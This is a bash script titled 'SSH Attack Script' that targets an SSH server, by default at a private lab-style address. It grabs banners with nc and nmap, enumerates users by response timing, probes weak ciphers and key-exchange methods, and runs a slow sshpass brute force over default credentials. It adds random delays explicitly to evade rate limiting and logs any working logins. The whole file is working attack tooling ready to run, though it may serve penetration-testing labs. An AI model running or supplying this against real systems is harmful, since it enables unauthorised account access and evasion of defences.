#!/bin/bash
###############################################################################
# SSH Attack Script
# User enumeration, banner grabbing, cipher enumeration, slow brute force
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.20}"
TARGET_PORT="${3:-22}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"

mkdir -p "$RESULTS_DIR"

echo "[*] SSH attacks: $SUBTYPE against ${TARGET_IP}:${TARGET_PORT}"

run_enum() {
    echo "[*] SSH user enumeration"

    # Nmap SSH scripts
    nmap -p "$TARGET_PORT" --script=ssh-auth-methods,ssh2-enum-algos \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_ssh.txt" 2>&1 || true

    # Timing-based user enumeration via SSH
    local users=("root" "admin" "msfadmin" "user" "test" "postgres" "mysql"
                 "ftp" "www-data" "nobody" "operator" "backup" "daemon"
                 "sshd" "mail" "guest" "oracle" "tomcat")

    echo "[*] Timing-based SSH user enumeration..."
    for user in "${users[@]}"; do
        # Connection attempt with timing
        start_time=$(date +%s%N)
        ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes \
            -p "$TARGET_PORT" "${user}@${TARGET_IP}" exit 2>/dev/null || true
        end_time=$(date +%s%N)
        elapsed=$(( (end_time - start_time) / 1000000 ))
        echo "  ${user}: ${elapsed}ms" >> "${RESULTS_DIR}/ssh_enum_timing.txt"
        sleep 1
    done

    echo "[+] SSH user enumeration complete"
}

run_banner() {
    echo "[*] SSH banner grabbing"

    # Netcat banner grab
    echo "" | nc -w 5 "$TARGET_IP" "$TARGET_PORT" > "${RESULTS_DIR}/ssh_banner.txt" 2>&1 || true

    # Nmap version detection
    nmap -p "$TARGET_PORT" -sV --version-intensity 9 \
        "$TARGET_IP" -oN "${RESULTS_DIR}/ssh_version.txt" 2>&1 || true

    # ssh-audit if available
    if command -v ssh-audit &>/dev/null; then
        ssh-audit "$TARGET_IP" -p "$TARGET_PORT" > "${RESULTS_DIR}/ssh_audit.txt" 2>&1 || true
    fi

    echo "[+] SSH banner grabbing complete"
}

run_cipher_enum() {
    echo "[*] SSH cipher enumeration"

    # Enumerate supported ciphers
    nmap -p "$TARGET_PORT" --script=ssh2-enum-algos \
        "$TARGET_IP" -oN "${RESULTS_DIR}/ssh_algos.txt" 2>&1 || true

    # Try connecting with weak ciphers
    local weak_ciphers=("aes128-cbc" "3des-cbc" "arcfour" "blowfish-cbc" "cast128-cbc")

    for cipher in "${weak_ciphers[@]}"; do
        echo "[*] Testing cipher: $cipher"
        ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes \
            -c "$cipher" -p "$TARGET_PORT" "test@${TARGET_IP}" exit 2>&1 | \
            head -1 >> "${RESULTS_DIR}/ssh_weak_ciphers.txt" || true
        sleep 0.5
    done

    # Try weak key exchange
    local weak_kex=("diffie-hellman-group1-sha1" "diffie-hellman-group-exchange-sha1")

    for kex in "${weak_kex[@]}"; do
        echo "[*] Testing KEX: $kex"
        ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes \
            -o KexAlgorithms="$kex" -p "$TARGET_PORT" "test@${TARGET_IP}" exit 2>&1 | \
            head -1 >> "${RESULTS_DIR}/ssh_weak_kex.txt" || true
        sleep 0.5
    done

    echo "[+] SSH cipher enumeration complete"
}

run_slow_brute() {
    echo "[*] Slow SSH brute force (rate-limiting evasion)"

    local users=("root" "admin" "msfadmin" "user" "test")
    local passwords=("password" "123456" "admin" "root" "msfadmin" "toor" "test")

    for user in "${users[@]}"; do
        for pass in "${passwords[@]}"; do
            echo "[*] Trying: ${user}/${pass}"
            sshpass -p "$pass" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
                -o BatchMode=yes -p "$TARGET_PORT" "${user}@${TARGET_IP}" exit 2>/dev/null
            if [[ $? -eq 0 ]]; then
                echo "[+] SUCCESS: ${user}/${pass}" | tee -a "${RESULTS_DIR}/ssh_found_creds.txt"
            fi
            # Slow delay to evade rate limiting
            sleep $((RANDOM % 5 + 3))
        done
    done

    echo "[+] Slow SSH brute force complete"
}

case "$SUBTYPE" in
    enum)           run_enum ;;
    banner)         run_banner ;;
    cipher_enum)    run_cipher_enum ;;
    slow_brute)     run_slow_brute ;;
    full)
        run_banner
        sleep 3
        run_enum
        sleep 3
        run_cipher_enum
        sleep 3
        run_slow_brute
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: enum, banner, cipher_enum, slow_brute, full"
        exit 1
        ;;
esac

echo "[*] SSH attack script complete"
